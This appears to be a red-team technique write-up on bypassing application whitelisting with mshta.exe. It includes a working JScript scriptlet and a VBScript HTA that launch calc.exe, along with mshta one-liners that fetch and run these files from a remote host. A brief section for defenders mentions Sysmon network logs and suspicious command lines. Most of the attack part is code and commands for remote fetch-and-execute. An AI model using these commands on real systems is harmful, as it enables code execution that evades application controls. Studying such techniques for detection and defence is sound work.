# Bypass Application Whitelisting by MSHTA

## Execution
Writing a scriptlet file that will launch `calc.exe` when invoked:

http://10.0.0.5/m.sct
```xml
<?XML version="1.0"?>
<scriptlet>
<registration description="Desc" progid="Progid" version="0" classid="{AAAA1111-0000-0000-0000-0000FEEDACDC}"></registration>

<public>
    <method name="Exec"></method>
</public>

<script language="JScript">
<![CDATA[
	function Exec()	{
		var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
	}
]]>
</script>
</scriptlet>
```

Invoking the scriptlet file hosted remotely:
  
Attacker@Victim:
```powershell
# from powershell
/cmd /c mshta.exe javascript:a=(GetObject("script:http://10.0.0.5/m.sct")).Exec();close();
```

### Observations
As expected, `calc.exe` is spawned by `mshta.exe`. Worth noting that **mhsta** and **cmd** exit almost immediately after invoking the **calc.exe**:

![power](https://github.com/Mehdi0x90/Red-Team/assets/17106836/4c68834d-0c71-453f-8244-95f8509c1f13)

As a defender, look at sysmon logs for mshta establishing network connections:

![mshta-connection](https://github.com/Mehdi0x90/Red-Team/assets/17106836/8a5315b3-97c3-47d4-b0b6-a2bb06c2e5b6)

Also, suspicious commandlines:

![1234](https://github.com/Mehdi0x90/Red-Team/assets/17106836/2eff5653-f88d-4add-b577-df48477bd128)


## Bonus
The hta file can be invoked like so:

```powershell
mshta.exe http://10.0.0.5/m.hta
```

![mshta-calc2](https://github.com/Mehdi0x90/Red-Team/assets/17106836/064675b2-0785-4919-8ef8-3693f06694e1)

or by navigating to the file itself, launching it and clicking run:

![ms](https://github.com/Mehdi0x90/Red-Team/assets/17106836/0845aecd-3e90-4421-86e2-27f05ca3b6b0)


http://10.0.0.5/m.hta
```html
<html>
<head>
<script language="VBScript"> 
    Sub RunProgram
        Set objShell = CreateObject("Wscript.Shell")
        objShell.Run "calc.exe"
    End Sub
RunProgram()
</script>
</head> 
<body>
    Nothing to see here..
</body>
</html>
```





















































































